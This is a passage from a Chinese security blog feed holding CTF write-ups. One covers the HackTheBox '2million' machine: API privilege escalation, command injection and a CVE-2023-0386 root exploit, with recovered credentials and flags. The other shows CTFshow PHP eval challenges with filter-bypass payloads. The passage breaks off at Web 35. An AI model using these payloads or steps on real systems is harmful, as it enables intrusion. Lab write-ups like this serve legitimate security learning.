function_">replace</span>(<span class="hljs-regexp">/^/</span>, <span class="hljs-title class_">String</span>)) &#123;<br>        <span class="hljs-keyword">while</span> (c--) &#123;<br>            d[c.<span class="hljs-title function_">toString</span>(a)] = k[c] || c.<span class="hljs-title function_">toString</span>(a)<br>        &#125;<br>        k = [<span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) &#123;<br>            <span class="hljs-keyword">return</span> d[e]<br>        &#125;<br>        ];<br>        e = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\\w+&#x27;</span><br>        &#125;<br>        ;<br>        c = <span class="hljs-number">1</span><br>    &#125;<br>    ;<span class="hljs-keyword">while</span> (c--) &#123;<br>        <span class="hljs-keyword">if</span> (k[c]) &#123;<br>            p = p.<span class="hljs-title function_">replace</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">&#x27;\\b&#x27;</span> + <span class="hljs-title function_">e</span>(c) + <span class="hljs-string">&#x27;\\b&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>), k[c])<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> p<br>&#125;(<span class="hljs-string">&#x27;1 i(4)&#123;h 8=&#123;&quot;4&quot;:4&#125;;$.9(&#123;a:&quot;7&quot;,5:&quot;6&quot;,g:8,b:\&#x27;/d/e/n\&#x27;,c:1(0)&#123;3.2(0)&#125;,f:1(0)&#123;3.2(0)&#125;&#125;)&#125;1 j()&#123;$.9(&#123;a:&quot;7&quot;,5:&quot;6&quot;,b:\&#x27;/d/e/k/l/m\&#x27;,c:1(0)&#123;3.2(0)&#125;,f:1(0)&#123;3.2(0)&#125;&#125;)&#125;&#x27;</span>, <span class="hljs-number">24</span>, <span class="hljs-number">24</span>, <span class="hljs-string">&#x27;response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify&#x27;</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;|&#x27;</span>), <span class="hljs-number">0</span>, &#123;&#125;))<br><br></code></pre></td></tr></table></figure><p>反混淆后</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">verifyInviteCode</span>(<span class="hljs-params">code</span>) &#123;<br>    <span class="hljs-keyword">var</span> formData = &#123; <span class="hljs-string">&quot;code&quot;</span>: code &#125;;<br>    $.<span class="hljs-title function_">ajax</span>(&#123;<br>        <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>        <span class="hljs-attr">dataType</span>: <span class="hljs-string">&quot;json&quot;</span>,<br>        <span class="hljs-attr">data</span>: formData,<br>        <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;/api/v1/invite/verify&#x27;</span>,<br>        <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response);<br>        &#125;,<br>        <span class="hljs-attr">error</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response);<br>        &#125;<br>    &#125;);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">makeInviteCode</span>(<span class="hljs-params"></span>) &#123;<br>    $.<span class="hljs-title function_">ajax</span>(&#123;<br>        <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>        <span class="hljs-attr">dataType</span>: <span class="hljs-string">&quot;json&quot;</span>,<br>        <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;/api/v1/invite/how/to/generate&#x27;</span>,<br>        <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response);<br>        &#125;,<br>        <span class="hljs-attr">error</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response);<br>        &#125;<br>    &#125;);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>可以发现路径名称</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What JavaScript function <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> invite page returns <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> hint <span class="hljs-keyword">about</span> how <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> an invite code? Don&#x27;t include () <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> answer.<br>:makeInviteCode<br></code></pre></td></tr></table></figure><h1 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h1><p>POST 请求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─# curl -X POST http://2million.htb/api/v1/invite/generate<br>&#123;<span class="hljs-string">&quot;0&quot;</span>:200,<span class="hljs-string">&quot;success&quot;</span>:1,<span class="hljs-string">&quot;data&quot;</span>:&#123;<span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-string">&quot;NTZRSlMtNDJLSjYtSTZXSTYtR1U5Mkc=&quot;</span>,<span class="hljs-string">&quot;format&quot;</span>:<span class="hljs-string">&quot;encoded&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p>然后 base 64 解码</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">56QJS</span>-<span class="hljs-number">42</span>KJ6-I6WI6-GU92G<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">The endpoint <span class="hljs-keyword">in</span> makeInviteCode <span class="hljs-keyword">returns</span> <span class="hljs-keyword">encrypted</span> data. That message provides another endpoint <span class="hljs-keyword">to</span> query. That endpoint <span class="hljs-keyword">returns</span> a code <span class="hljs-keyword">value</span> that <span class="hljs-keyword">is</span> encoded <span class="hljs-keyword">with</span> what very common binary <span class="hljs-keyword">to</span> <span class="hljs-type">text</span> <span class="hljs-keyword">encoding</span> <span class="hljs-keyword">format</span>. What <span class="hljs-keyword">is</span> the <span class="hljs-type">name</span> <span class="hljs-keyword">of</span> that <span class="hljs-keyword">encoding</span>?<br>:base64<br></code></pre></td></tr></table></figure><h1 id="Task-5"><a href="#Task-5" class="headerlink" title="Task 5"></a>Task 5</h1><p>注册登录账号然后进去到 <code>ACCESS</code> 抓包</p><p><img src="https://img.dkdun.cn/v1/2025/12/a14a654b8af50b27.png"></p><p>路径 <code>/api/v1/user/vpn/generate</code></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">What</span> is the path to the endpoint the page uses <span class="hljs-keyword">when</span> a user clicks on <span class="hljs-string">&quot;Connection Pack&quot;</span>?<br><span class="hljs-symbol">:/api/v1/user/vpn/generate</span><br></code></pre></td></tr></table></figure><h1 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h1><p>访问接口 <code>/api/v1</code> 返回了很多其他接口</p><p><img src="https://img.dkdun.cn/v1/2025/12/2d7ad1e6dde9a058.png"></p><p>访问 <code>/api/v1/admin/settings/update</code> 接口返回了错误信息，加上 <code>Content-type:application/json</code>，用 <code>PUT</code> 方式请求</p><p><img src="https://img.dkdun.cn/v1/2025/12/3aa6b728dd077173.png"></p><p>提示没有 <code>email</code> 参数，设置 <code>email</code> 参数，为注册的 email </p><p><img src="https://img.dkdun.cn/v1/2025/12/dd7812022fe4fd51.png"></p><p>再次请求提示没有 <code>is_admin</code> 参数</p><p><img src="https://img.dkdun.cn/v1/2025/12/bf67adf68542895d.png"></p><p>再设置 <code>is_admin</code> 参数为 1</p><p><img src="https://img.dkdun.cn/v1/2025/12/da66390cc4a6df62.png"></p><p>返回了用户信息，应该是越权成功了，GET 访问一下 <code>/api/v1/admin/auth</code> 返回了 <code>true</code> ，说明确实成功了</p><p><img src="https://img.dkdun.cn/v1/2025/12/ba02b821e91d349f.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">How many API endpoints are there under /api/v1/admin?<br>:3<br></code></pre></td></tr></table></figure><h1 id="Task-7"><a href="#Task-7" class="headerlink" title="Task 7"></a>Task 7</h1><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">What</span> <span class="hljs-title class_">API</span> endpoint can change a user account to an admin account?<br><span class="hljs-symbol">:/api/v1/admin/settings/update</span><br></code></pre></td></tr></table></figure><h1 id="Task-8"><a href="#Task-8" class="headerlink" title="Task 8"></a>Task 8</h1><p>POST 访问 <code>/api/v1/admin/vpn/generate</code>，返回</p><p><img src="https://img.dkdun.cn/v1/2025/12/90712f882cc62d7e.png"></p><p>然后随便填一个用户名也能返回，然后修改字段</p><p><img src="https://img.dkdun.cn/v1/2025/12/e26da4534dc9155a.png"></p><p>说明存在命令执行</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">What</span> <span class="hljs-title class_">API</span> endpoint has a command injection vulnerability <span class="hljs-keyword">in</span> it?<br><span class="hljs-symbol">:/api/v1/admin/vpn/generate</span><br></code></pre></td></tr></table></figure><h1 id="Task-9"><a href="#Task-9" class="headerlink" title="Task 9"></a>Task 9</h1><p>反弹一个 shell 监听</p><p><img src="https://img.dkdun.cn/v1/2025/12/d3a92eac39faa3c3.png"></p><p>然后列出文件，找到了 <code>.env</code> 得到了用户和密码</p><p><img src="https://img.dkdun.cn/v1/2025/12/4128efc1253ad083.png"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmd">DB_HOST=<span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br>DB_DATABASE=htb_prod<br>DB_USERNAME=admin<br>DB_PASSWORD=SuperDuperPass123<br></code></pre></td></tr></table></figure><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">What <span class="hljs-keyword">file</span> <span class="hljs-keyword">is</span> commonly used <span class="hljs-keyword">in</span> PHP applications <span class="hljs-keyword">to</span> store environment <span class="hljs-keyword">variable</span> values?<br>:env<br></code></pre></td></tr></table></figure><h1 id="Submit-User-Flag"><a href="#Submit-User-Flag" class="headerlink" title="Submit User Flag"></a>Submit User Flag</h1><p>ssh 直接登录拿到 userflag</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">Submit the flag located in the admin user&#x27;s home directory.<br>:efdaf<span class="hljs-number">723</span>f<span class="hljs-number">682</span>ab<span class="hljs-number">1</span>f<span class="hljs-number">854</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">76e7909794</span><br></code></pre></td></tr></table></figure><h1 id="Task-11"><a href="#Task-11" class="headerlink" title="Task 11"></a>Task 11</h1><p>登录提示有 email</p><p><img src="https://img.dkdun.cn/v1/2025/12/4f9a226d09f42536.png"></p><p>查找有 email 的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;mail&quot;</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/1d7cbf874fffd1da.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> email address <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> sender <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> email sent <span class="hljs-built_in">to</span> admin?<br>:ch4p@<span class="hljs-number">2</span>million.htb<br></code></pre></td></tr></table></figure><h1 id="Task-12"><a href="#Task-12" class="headerlink" title="Task 12"></a>Task 12</h1><p>查看 admin 内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">From: ch4p &lt;ch4p@2million.htb&gt;<br>To: admin &lt;admin@2million.htb&gt;<br>Cc: g0blin &lt;g0blin@2million.htb&gt;<br>Subject: Urgent: Patch System OS<br>Date: Tue, 1 June 2023 10:45:22 -0700<br>Message-ID: &lt;9876543210@2million.htb&gt;<br>X-Mailer: ThunderMail Pro 5.2<br><br>Hey admin,<br><br>I<span class="hljs-string">&#x27;m know you&#x27;</span>re working as fast as you can to <span class="hljs-keyword">do</span> the DB migration. While we<span class="hljs-string">&#x27;re partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can&#x27;</span>t get popped by that.<br><br>HTB Godfather<br></code></pre></td></tr></table></figure><p>可以看到其中有一个 <code>OverlayFS</code> 搜 CVE，关于 <code>Linux kernel CVE</code> ，Linux 内核</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> <span class="hljs-number">2023</span> CVE ID <span class="hljs-keyword">for</span> <span class="hljs-keyword">a</span> vulnerability <span class="hljs-keyword">in</span> that allows <span class="hljs-keyword">an</span> attacker <span class="hljs-built_in">to</span> move <span class="hljs-built_in">files</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> Overlay <span class="hljs-built_in">file</span> <span class="hljs-keyword">system</span> <span class="hljs-keyword">while</span> maintaining metadata like <span class="hljs-keyword">the</span> owner <span class="hljs-keyword">and</span> SetUID bits?<br>:CVE<span class="hljs-number">-2023</span><span class="hljs-number">-0386</span><br></code></pre></td></tr></table></figure><h1 id="Submit-Root-Flag"><a href="#Submit-Root-Flag" class="headerlink" title="Submit Root Flag"></a>Submit Root Flag</h1><p>开两个终端，把 CVE 传到靶机上，编译之后（编译会报错，但是不影响）在第一个终端输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./fuse ./ovlcap/lower ./gc<br></code></pre></td></tr></table></figure><p>第二个终端输入</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">./<span class="hljs-built_in">exp</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/6e0210e649704aca.png"></p><p>拿到 root 权限</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Submit the flag located in root&#x27;s home directory.<br>:3a<span class="hljs-number">62869985</span>c7bf<span class="hljs-number">6157</span>abcb<span class="hljs-number">2661</span>ce<span class="hljs-number">6983</span><br></code></pre></td></tr></table></figure><h1 id="CVE-2023-0386"><a href="#CVE-2023-0386" class="headerlink" title="CVE-2023-0386"></a>CVE-2023-0386</h1><p>具体漏洞分析：<a href="https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/%EF%BC%8Chttps://github.com/chenaotian/CVE-2023-0386">https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/，https://github.com/chenaotian/CVE-2023-0386</a></p><p>exploit：<a href="https://github.com/xkaneiki/CVE-2023-0386/">https://github.com/xkaneiki/CVE-2023-0386/</a></p><p>这个 CVE 主要是关于 Linux 内核的 <code>OverlayFS</code> 子系统，当用户将一个具有权限的文件从一个 nosuid 挂载点复制到另一个挂载点时，未经授权的攻击者可以执行 setuid 文件，导致权限提升。</p><p>漏洞触发逻辑是如果 <code>overlay</code> 文件系统发生了<code>copy-up</code> 操作（尝试修改下层文件，触发下层文件向上层拷贝）的时候，如果下层文件系统是一个用户文件系统（比如 fuse），可以自定义任何文件，但该文件系统存在限制（比如 nosuid），这个漏洞就允许将下层用户自定义的 suid 文件从一个 nosuid 文件系统拷贝到一个正常文件系统中，从而导致非法 suid 获取真正的 suid 特权，毕竟在文件拷贝的时候并不是单纯地只拷贝文件内容，还包括了文件的权限信息、时间戳等信息一起被拷贝。</p><p>FUSE 文件系统（Filesystem in Userspace）,Linux 下的用户态文件系统接口，允许用户在用户空间（而非内核空间）实现和运行自定义的文件系统。允许在用户层定义文件系统的一些回调函数比如 open、write 甚至 getattr 等文件元数据信息。</p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB 渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFshow-命令执行</title>
    <link href="/2025/03/15/CTFshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2025/03/15/CTFshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<p><del>未完待续</del> 已完结</p><span id="more"></span><h1 id="Web-29"><a href="#Web-29" class="headerlink" title="Web 29"></a>Web 29</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 00:26:48<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;<br>        eval($c);<br>    &#125;<br>    <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>发现过滤了 flag，对 <code>preg_match</code> 进行绕过，并且 cat 也是被过滤了，所以构造 payload </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=system(&quot;ls&quot;);<br>?c=system(&quot;tac fla*.php&quot;);<br></code></pre></td></tr></table></figure><h1 id="Web-30"><a href="#Web-30" class="headerlink" title="Web 30"></a>Web 30</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 00:42:26<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;<br>        eval($c);<br>    &#125;<br>    <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤了 <code>flag、system、php</code> ，那么对于命令执行函数我们除了 <code>system()</code> 还能用：<strong>exec()、shell_exec()、passthru()、popen()、反引号等</strong>，所以我们能构造 payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=passthru(&quot;tac fl??.ph*&quot;);<br></code></pre></td></tr></table></figure><p><code>tac</code> 还能换成 <code>tail</code></p><h1 id="Web-31"><a href="#Web-31" class="headerlink" title="Web 31"></a>Web 31</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 00:49:10<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;, $c))&#123;<br>        eval($c);<br>    &#125;<br>    <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>简单绕过，payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=passthru(&quot;tac%09fl**&quot;);<br></code></pre></td></tr></table></figure><p>因为空格和 <code>.</code> 也被过滤了，空格可以用 <code>%09</code> 或 <code>&#123;$IFS&#125;</code> 绕过，<code>flag.php</code> 能用通配符 <code>*</code> 绕过</p><h1 id="Web-32"><a href="#Web-32" class="headerlink" title="Web 32"></a>Web 32</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 00:56:31<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;, $c))&#123;<br>        eval($c);<br>    &#125;<br>    <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>无法用替代绕过了，那么可以试试文件包含</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h1 id="Web-33"><a href="#Web-33" class="headerlink" title="Web 33"></a>Web 33</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 02:22:27<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br>*/<br>//<br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;, $c))&#123;<br>        eval($c);<br>    &#125;<br>    <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>就比 web32 多过滤了个双引号，可以用上面的 payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br>?c=require$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h1 id="Web-34"><a href="#Web-34" class="headerlink" title="Web 34"></a>Web 34</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 04:21:29<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br>*/<br><br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;, $c))&#123;<br>        eval($c);<br>    &#125;<br>    <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>只是多过滤了一个 <code>:</code> ，所以还能用文件包含读取</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=require$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br>?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h1 id="Web-35"><a href="#Web-35" class="headerlink" title="Web 35"></a>Web 35</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 